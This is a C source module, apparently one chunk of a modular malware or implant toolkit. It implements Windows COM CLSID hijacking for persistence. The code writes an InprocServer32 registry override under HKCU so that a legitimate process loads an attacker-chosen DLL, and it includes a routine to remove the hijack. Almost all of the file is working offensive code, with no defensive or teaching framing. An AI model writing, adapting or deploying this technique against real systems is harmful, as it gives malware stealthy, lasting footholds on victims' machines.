// chunk: persist/com_hijack
// depends: (none)
// provides: persist_com_hijack
// headers: windows.h
// note: COM CLSID hijack — override InprocServer32 under HKCU so legitimate process loads our DLL

#ifndef CHUNK_PERSIST_COM_HIJACK
#define CHUNK_PERSIST_COM_HIJACK

static int persist_com_hijack(const char *clsid, const char *dll_path) {
    char key[512];
    snprintf(key, sizeof(key), "Software\\Classes\\CLSID\\%s\\InprocServer32", clsid);

    HKEY hk;
    DWORD disp;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, &disp) != ERROR_SUCCESS)
        return 0;

    RegSetValueExA(hk, NULL, 0, REG_SZ, (const BYTE *)dll_path, (DWORD)strlen(dll_path) + 1);
    RegSetValueExA(hk, "ThreadingModel", 0, REG_SZ, (const BYTE *)"Both", 5);
    RegCloseKey(hk);
    return 1;
}

static void remove_com_hijack(const char *clsid) {
    char key[512];
    snprintf(key, sizeof(key), "Software\\Classes\\CLSID\\%s\\InprocServer32", clsid);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    snprintf(key, sizeof(key), "Software\\Classes\\CLSID\\%s", clsid);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
}

#endif
